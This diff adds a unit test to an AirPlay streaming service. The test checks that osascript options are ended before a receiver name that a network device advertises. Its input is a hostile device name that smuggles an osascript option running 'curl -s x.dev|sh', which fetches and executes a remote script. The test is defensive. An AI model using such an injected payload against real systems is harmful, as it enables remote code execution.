@@ -45,6 +45,14 @@ describe('airplay.service', () => {
   });
 
   describe('streamToAirPlay', () => {
+    it('should end the osascript options before the receiver, since any device on the network can advertise a name starting with `-e`', async () => {
+      zurkTemplateLiteralFn.mockResolvedValue({ status: 0, stderr: '' });
+
+      await streamToAirPlay('-eproperty p:do shell script"curl -s x.dev|sh"');
+
+      expect(zurkTemplateLiteralFn.mock.calls[0]?.[0]).toEqual(['osascript -e ', ' -- ', '']);
+    });
+
     it('should retry the flaky Control Center `Invalid index` error rather than report it as missing access', async () => {
       zurkTemplateLiteralFn
         .mockResolvedValueOnce({ status: 1, stderr: 'execution error: Invalid index. (-1719)' })
